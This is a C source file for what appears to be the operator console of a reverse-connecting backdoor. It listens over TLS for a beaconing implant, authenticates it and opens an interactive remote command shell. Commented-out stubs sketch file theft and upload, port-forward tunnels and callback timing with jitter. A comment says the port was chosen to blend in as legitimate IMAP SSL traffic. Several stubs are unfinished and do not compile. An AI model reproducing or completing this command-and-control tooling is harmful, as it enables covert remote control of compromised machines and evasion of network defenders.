#include "client.h"

#define USAGE                                                                 \
"usage:\n"                                                                    \
"  echoclient [options]\n"                                                    \
"options:\n"                                                                  \
"  -a                  Address to send the message.\n"                        \
"  -p                  Port to send to.\n"                                    \
"  -h                  Show this help message\n"                              \

/* OPTIONS DESCRIPTOR ====================================================== */
static struct option gLongOptions[] = {
  {"authenticate",     required_argument,      NULL,           'a'},
  {"port",             required_argument,      NULL,           'p'},
  {"help",             no_argument,            NULL,           'h'},
  {NULL,               0,                      NULL,             0}
};

//Prototype functions
int parseargs(int, char **, char **, int *);
int setuplistner(int, int *);
SSL_CTX* initCTX(void);
void loadcert(SSL_CTX *, char *, char *);
int cmdshell(SSL *);
void displayhelp(void);
int entersession(SSL *, char *);
ssize_t ssl_readall(SSL *, uint8_t *, size_t, size_t *);
ssize_t ssl_writeall(SSL *, uint8_t *, size_t, size_t *);
ssize_t writeall(int, uint8_t *, size_t, size_t *);

// Setup the main listening port
int setuplistner(int port, int *sockfd) {
  struct addrinfo hints, *servinfo, *p;
  int optval = 1;
  int status;
  char portstr[6];

  // Populate the hints for the following getaddrinfo()
  memset(&hints, 0, sizeof hints);    // Ensure the struct is empty
  hints.ai_family = AF_UNSPEC;        // Indiferent to IPv4 or IPv6
  hints.ai_socktype = SOCK_STREAM;    // TCP stream socket
  hints.ai_flags = AI_PASSIVE;        // Populate the IP for me

  // Get a string version of the port to bind to
  snprintf(portstr, 6,"%d", port);

  // Get address info
  if ((status = getaddrinfo(NULL, portstr, &hints, &servinfo)) != 0) {
    fprintf(stderr, "[-] Failed to acquire getaddrinfo: %s\n", gai_strerror(status));
    return -1;
  };

  // Loop through all returned interfaces and bind to the first viable one
  for(p = servinfo; p != NULL; p = p->ai_next) {
    // Check to see if the addrsocket works
    if ((*sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
      perror("[-] Unable to acquire a socket.");
      continue;
    }

    // Attempt to set socket to reuseaddr
    if (setsockopt(*sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(int)) == -1) {
      perror("[-] Unable to set socket reuse.");
      return -1;
    }

    // Bind to the specified port using the socket
    if (bind(*sockfd, p->ai_addr, p->ai_addrlen) == -1) {
      close(*sockfd);
      perror("[-] Unable to bind the socket.");
      continue;
    }
    break;
  }

  freeaddrinfo(servinfo);  // All done with the struct at this point

  // Report errors if we are unable to bind
  if (p == NULL) {
    fprintf(stderr, "[-] Failed to bind to %d\n", port);
    return -1;
  }

  // Attempt to listen
  if (listen(*sockfd, 2) == -1) {
    perror("[-] Failed to listen.");
    return -1;
  }

  // The socket is now listening and ready to be utilized
  // Pass the sockfd back to the main program to be utilized
  printf("[+] Client has started listening on 0.0.0.0:%s.\n", portstr);
  printf("[*] Awaiting connections from server.\n");
  return 0; 
}

// Initialize the SSL context
SSL_CTX* initCTX(void) {
  SSL_CTX *ctx;
  const SSL_METHOD *method;

  OpenSSL_add_all_algorithms();       // Load & register all cryptos, etc.
  SSL_load_error_strings();           // Load all error messages
  method = TLS_server_method();   // Create new server-method instance
  ctx = SSL_CTX_new(method);          // Create new context from method
  if (ctx == NULL) {                  // Check for errors
    ERR_print_errors_fp(stderr);
    abort();
  }

  return ctx;
}

// Load the certificates into the process for use
void loadcert(SSL_CTX* ctx, char *cert, char *key) {
    // Set the local certificate from CertFile
    if (SSL_CTX_use_certificate_file(ctx, cert, SSL_FILETYPE_PEM) <= 0 ) {
        ERR_print_errors_fp(stderr);
        abort();
    }
    // Set the private key from KeyFile
    if (SSL_CTX_use_PrivateKey_file(ctx, key, SSL_FILETYPE_PEM) <= 0 ) {
        ERR_print_errors_fp(stderr);
        abort();
    }
    // Verify the private key
    if (!SSL_CTX_check_private_key(ctx) ) {
        fprintf(stderr, "Private key does not match the public certificate\n");
        abort();
    }
}

/*
// Spawn a new connection immediately
int newconn(SSL *ssl, char addr, char port) {

}
*/
// Enter into a remote shell
int cmdshell(SSL *ssl) {
  uint8_t msg[4096] = {0};
  uint8_t buf[4096] = {0};
  int exit = 0, res;
  size_t total_sent = 0, total_recv = 0;

  // Send the command to the remote server
  ssl_writeall(ssl, (uint8_t *)"2", 2, &total_sent);

  // Wait for the server to send back the date command.
  ssl_readall(ssl, buf, sizeof(buf), &total_recv);
  printf("Remote Shell Activated At: %s", buf);

  // Start a command loop -- interactive commands like vim, tmux, top, bash, ect will likely cause problems.
  //  this is because the data on the remote end is being fed to popen in a single pass. Will have to confirm later.
  while (1) {
    printf("sbsh> ");
    fgets((char *)msg, sizeof(msg), stdin);
    if (strcmp((char *)msg, "exit\n") == 0) {
      ssl_writeall(ssl, msg, sizeof(msg), &total_sent);
      break;
    }

    if (strcmp((char *)msg, "\n") == 0) {
      continue;
    }

    if (ssl_writeall(ssl, msg, sizeof(msg), &total_sent) < 0) {
      fprintf(stderr, "[-] Failed write to the server - exiting the shell interface now.\n");
      exit = -1;
      break;
    }
    memset(msg, 0, sizeof(msg));
    while((res = ssl_readall(ssl, buf, sizeof(buf), &total_recv)) > 0) {
      if (res == 1 && strcmp((char *)&buf[0],"\0") == 0) {
        break;
      }
      printf("%s", buf);
      memset(buf, 0, sizeof(buf));
    }
    memset(buf, 0, sizeof(buf));
  }

  return exit;
}
/*
// Retrieve a file from the remote system; place in /tmp with the specified localname
int getfile(SSL *ssl, char remotepath, char localpath) {
  int fd, exit = 0;
  char ans[256] = {0};
  char buf[4096] = {0};
  ssize_t filesize = 0;
  size_t total_recv = 0, total_sent = 0, written = 0;

  // Send the server a message letting it know we would like to recieve a file
  ssl_writeall(ssl, "3", 2, &total_sent);

  // Make sure the server is good to go with allowing us to recieve a file
  ssl_readall(ssl, ans, sizeof(ans), &total_recv);
  strcmp(ans, "300");

  // Send the file name that we would like to get 
  ssl_writeall(ssl, &remotepath, sizeof(remotepath), &total_sent);

  // If the server can open the file it will send us the size of the file to be recieved
  memset(ans, 0, sizeof(ans));
  ssl_readall(ssl, ans, sizeof(ans), &total_recv);
  if (atoi(ans) < 1) {
    fprintf(stderr, "[-] There was an error getting the size of the remote file.\n");
    exit = -1;
    goto leave;
  }

  // Create or open the local file 
  fd = open(localpath, O_RDWR, O_CREAT);

  // Message the server that we are ready to download
  ssl_writeall(ssl, "301", 3, &total_sent);

  // Download the file
  printf("[*] Getting remote file %s and placing at %s.\n", remotepath, localpath);
  total_recv = 0;
  while(total_recv < filesize) {
    ssl_readall(ssl, buf, sizeof(buf), &total_recv);
    writeall(fd, buf, sizeof(buf), written);
    memset(buf, 0, sizeof(buf));
    written = 0;
  }
  close(fd);

  printf("[+] Wrote %ld bytes to %s.\n", total_recv, localpath);

  leave:
  return exit;
}

// Put a file on the remote system; place at the specified remote path
int putfile(SSL *ssl, char localpath, char remotepath) {
  int localfd;
  ssize_t total_sent = 0;

  // Check if the local file exists and can be opened
  if ((localfd = open(localfile, O_RDONLY)) != 0) {
    perrror("[-] Failed to open the local file for reading.");
    return -1;
  }
  
  // Tell the server what we would like to do and wait for confirmation that we are good to proceed. 
  printf("[*] Sending request for server to enter put mode.\n");
  SSL_write()


  printf("[*] Server is in put mode and awaiting file transfer.\n");

  // Tell the user what file they are getting and where it is being placed.
  printf("[*] Putting local file %s on remote at %s\n", localfile, remotepath);

  // Check with remote to ensure the remote path exists and the file can be written

  // Tell remote to get ready to transfer the stream of bytes into the file
  printf("[*] Putting local file %s on remote at %s\n", localfile, remotepath);
  

}

// Establish a portforwarded tunnel
int tunnel(SSL *ssl, char lport, char addr, char rport) {

}

// Set the time window to call back in; extended option is to set the jitter as well
int window(SSL *ssl, char win, char jitter) {

}

// Exit the session and tear down.
int goodbye(SSL *ssl) {

}

*/
// Display total help menu
void displayhelp() {
  fprintf(stderr, "=====================================\n"
    "Help Mneu\n"
    "\n"
    "sbc> new <address> <port>\n"
    "sbc> cmd\n"
    "sbc> get <remotepath> <localname>\n"
    "sbc> put <localpath> <remotepath>\n"
    "sbc> tun <lport> <address> <rport>\n"
    "sbc> win <time-window> <jitter>\n"
    "sbc> bye\n"
    "\n"
    "=====================================\n"
  );
}
/*
int parsecmd(char *msg, char **cmdv[]) {
  int res, i, quotes = 0;
  char *spaceptr, *quoteptr;
  char buf[4096];
  
  for (size_t i = 0; i < 5; i++) {
    char *cmdv[i] = strtok_r(msg, " ", &spaceptr);
    if ((quoteptr = strpbrk(cmdv[i], "\"")) != NULL) {
        strlcpy(buf); 
    }
  }

  if ((res = strcmp(*cmdv[0], "new")) == 0) {
    return 1;
  }
  if ((res = strcmp(*cmdv[0], "cmd")) == 0) {
    return 2; 
  }
  if ((res = strcmp(*cmdv[0], "get")) == 0) {
    return 3;
  }
  if ((res = strcmp(*cmdv[0], "put")) == 0) {
    return 4; 
  }
  if ((res = strcmp(*cmdv[0], "tun")) == 0) {
    return 5;
  }
  if ((res = strcmp(*cmdv[0], "win")) == 0) {
    return 6; 
  }
  if ((res = strcmp(*cmdv[0], "bye")) == 0) {
    return 7;
  }

  return -1;
}
*/
int entersession(SSL *ssl, char *auth) { // threadable
  uint8_t buf[4096] = {0};
  uint8_t msg[4096] = {0};
  //char *cmdv[5] = {NULL};
  size_t total_recv = 0, total_sent = 0;
  int bytes, sd, exit = 0, cmd = -1;
  // Accept the inbound SSL connection
  if (SSL_accept(ssl) != 1) {                                   
    ERR_print_errors_fp(stderr);
    exit = -1;
    goto cleanup;
  }
  
  SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);

  printf("[+] Connected with %s encryption\n", SSL_get_cipher(ssl));

  // Read the message sent which should be a request to authenticate "authenticate" is passed.
  if ((bytes = ssl_readall(ssl, buf, sizeof(buf), &total_recv) < 0)) {     
    exit = -1;
    goto cleanup;
  }         
  if (strcmp((char *)buf, "10") != 0) {
    fprintf(stderr, "[-] Did not send authenticate message, recieved: %s.\n", buf);                             
    exit = -1;
    goto cleanup;
  }
  printf("[+] Server is ready for authentication.\n");

  // Send the authentication message
  printf("[*] Authenticating with: %s\n", auth);
  ssl_writeall(ssl, (uint8_t *)auth, strlen(auth), &total_sent);
  ssl_writeall(ssl, (uint8_t *)"", 1, &total_sent);                                
  printf("[*] Authentication message sent.\n");
  
  // Check to make sure the server is happy with the auth message
  //  3 shots at getting the right message else server initiates disconnect.
  memset(buf, 0, sizeof(buf));
  if ((bytes = ssl_readall(ssl, buf, sizeof(buf), &total_recv)) < 0) {
    fprintf(stderr, "[-] Error reading from the server. Exiting now.\n");
    exit = -1;
    goto cleanup;
  }
  while(strcmp((char *)buf, "50") == 0) {
    fprintf(stderr, "[-] Authentication messages did not match. Please input the proper message.\n");
    printf("> Enter Authentication Message: ");
    fgets((char *)msg, 4096, stdin);
    printf("[*] About to send: %s", msg);
    if ((bytes = ssl_writeall(ssl, msg, sizeof(msg), &total_sent)) < 0) {
      fprintf(stderr, "[-] Error writing new authentication message to the server. Exiting now.\n");
      exit = -1;
      goto cleanup;
    }
    memset(buf, 0, sizeof(buf));
    if ((bytes = ssl_readall(ssl, buf, sizeof(buf), &total_recv)) < 0) {
      fprintf(stderr, "[-] Error reading from the server. Exiting now.\n");
      exit = -1;
      goto cleanup;
    }
  }

  // Print Help Menu and then enter into menued context
  displayhelp();
  while(1) {
    memset(buf, 0, sizeof(buf));
    memset(msg, 0, sizeof(msg));
    //fgets(msg, 4096, sizeof(msg));

    //printf("sbc> ");
    cmd = 2; //parsecmd(*msg, *cmdv);

    switch(cmd) {
      case NEW:
        //newconn(ssl, cmdv[1], cmdv[2]);
        break;
      case CMD:
        cmdshell(ssl);
        break;
      case GET:
        //getfile(ssl, cmdv[1], cmdv[2]);
        break;
      case PUT:
        //putfile(ssl, cmdv[1], cmdv[2]);
        break;
      case TUN:
        //tunnel(ssl, cmdv[1], cmdv[2], cmdv[3]);
        break;
      case WIN:
        //window(ssl, cmdv[1], cmdv[2]);
        break;
      case BYE:
        //goodbye(ssl);
        goto cleanup;
      default:
        displayhelp();
        break;
    }
  }

  cleanup:
  sd = SSL_get_fd(ssl);                       // Get socket connection
  SSL_free(ssl);                              // Release SSL state
  close(sd);                                  // Close connection
  return exit;
}

ssize_t ssl_readall(SSL *ssl, uint8_t *buf, size_t len, size_t *total_recv) {
    int r = 0;
    size_t recvd = 0;

    while (recvd < len) {
      r = SSL_read(ssl, &buf[recvd], len-recvd);
      if (r < 0) {
        perror("[-] ERROR: SSL_read encountered and error");
        break;
      } else if (r == 0) {
        break;
      } else {
        recvd += r;
        (*total_recv) += r;
        if (strcmp((char *)&buf[recvd-1], (char *)"\0") == 0) {
          break;
        }
      }
    }
    return r;
}

ssize_t ssl_writeall(SSL *ssl, uint8_t *msg, size_t len, size_t *total_sent) {
  int s = 0;
  size_t sent = 0;

  while (sent < len) {
    if ((s = SSL_write(ssl,  &msg[sent], len-sent)) < 0) {
      perror("[-] ERROR: SSL_write encountered an error");
      break;
    }
    (*total_sent) += s;
    sent += s;
  }

  return s;
}

ssize_t writeall(int fd, uint8_t *buf, size_t len, size_t *total_written) {
  ssize_t w = 0;
  size_t written = 0;
  
  while(written < len) {
    if ((w = write(fd, &buf[written], len-written)) < 0) {
      perror("[-] ERROR: Write function encountered an error");
      break;
    }
    (*total_written) += w;
    written += w;
  }

  return w;
}

/*
ssize_t readall(int fd, uint8_t *buf, size_t len, size_t *total_read) {
  ssize_t r = 0;
  size_t red = 0;

  while (red < len) {
    r = read(fd, &buf[red], len-red);
    if (r < 0) {
      perror("[-] ERROR: Read function encountered an error");
      break;
    } else if (r == 0) {
      break;
    } else {
      red += r;
      (*total_read) += r;
    }
  }
}
*/
int parseargs(int argc, char **argv, char **auth, int *port) {
  int option_char;
  char *authentication;
  int portno;

  // Parse and set command line arguments
  while ((option_char = getopt_long(argc, argv, "a:p:h", gLongOptions, NULL)) != -1) {
    switch (option_char) {
      case 'a':         // The authentication string to utilize
        authentication = optarg;
        break;
      case 'p':         // The port number to send traffic to. 
        portno = atoi(optarg);
        break;
      case 'h':         // Help message
        fprintf(stdout, "%s", USAGE);
        exit(0);
        break;
      default:
        fprintf(stderr, "%s", USAGE);
        exit(1);
    }
  }

  // Bounds and intialization checking
  if ((portno <= 0) || (portno > 65535)) {
    fprintf(stderr, "[-] ERROR: %s @ %d: invalid port number (%d).\n", __FILE__, __LINE__, portno);
    return -1;
  }

  *auth = calloc((strlen(authentication)+1), sizeof(char));
  if (auth == NULL) {
    fprintf(stderr, "[-] ERROR: Failed to allocate memory for the message.\n");
    return -1;
  }

  // Assign variable contents
  memcpy(*auth, authentication, (strlen(authentication)+1));
  (*port) = portno;

  return 0;
}

int main(int argc, char **argv) {
    // Variables
    int res;                                // Result of a function -- useful if we need to compare later on. 
    int port = SERVE_PORT;                  // Server port number -- IMAP SSL to potentially blend as legitimate SSL traffic.
    char *auth = NULL;                      // The authentication phrase 
    SSL_CTX *ctx;                           // SSL connection context pointer
    int sockfd;                             // The main listener socket file descriptor
    struct sockaddr_storage server;         // The sockaddr for the server that is beaconing
    socklen_t socklen = sizeof(server);     // The socklen for the server that is beaconing 
    SSL *ssl;                               // The SSL session pointer that is associated with a given session.
    int serverfd;                           // The serverfd that will be where we pass messages.
    struct sockaddr_storage peer;           // The storage space that will reveal the peer address information.
    socklen_t peerlen;                      // The peerlen message that is required for printing out peer info.
    char ipstr[INET6_ADDRSTRLEN];           // The ip address string for the peer -- is large enough to hold the max IPv6 length address.

    // Ensure the user is running as root
    if(getuid() != 0) {
        fprintf(stderr, "[-] This program must be run as root/sudo user!");
        exit(0);
    }

    // Parse the arguments passed
    if ((res = parseargs(argc, argv, &auth, &port)) != 0) {
      fprintf(stderr, "[-] Bailing early due to previous error.");
      free(auth);
      exit(1);
    }

    // Initialize the SSL library
    SSL_library_init();                                                             // Get SSL library ready
    ctx = initCTX();                                                                // Initialize SSL
    loadcert(ctx, (char *)"../src/mycert.pem", (char *)"../src/mycert.pem");                                      // Load certs

    // Setup the core listening socket
    setuplistner(port, &sockfd);                                           // Create server socket
    
    // Catch a connection and start a session
    serverfd = accept(sockfd, (struct sockaddr *)&server, &socklen);                // Accept connection as usual

    // Print who we are speaking to.
    peerlen = sizeof(peer);
    getpeername(serverfd, (struct sockaddr*)&peer, &peerlen);
    if (peer.ss_family == AF_INET) {
      struct sockaddr_in *p = (struct sockaddr_in *)&peer;
      port = ntohs(p->sin_port);
      inet_ntop(AF_INET, &p->sin_addr, ipstr, sizeof ipstr);
    } else { // AF_INET6
      struct sockaddr_in6 *p = (struct sockaddr_in6 *)&peer;
      port = ntohs(p->sin6_port);
      inet_ntop(AF_INET6, &p->sin6_addr, ipstr, sizeof ipstr);
    } 
    printf("[+] Established connection with server at %s:%d.\n", ipstr, port);
    
    // Establish an SSL connection
    ssl = SSL_new(ctx);                                                             // Get new SSL state with context
    SSL_set_fd(ssl, serverfd);                                                      // Set connection socket to SSL state
    
    // Enter into our session
    entersession(ssl, auth);                                                        // Enter into the session connection
    
    // Clean up the memory space and gracefully exit.
    close(serverfd);                                                                // Close the server socket
    SSL_CTX_free(ctx);                                                              // Release the context
}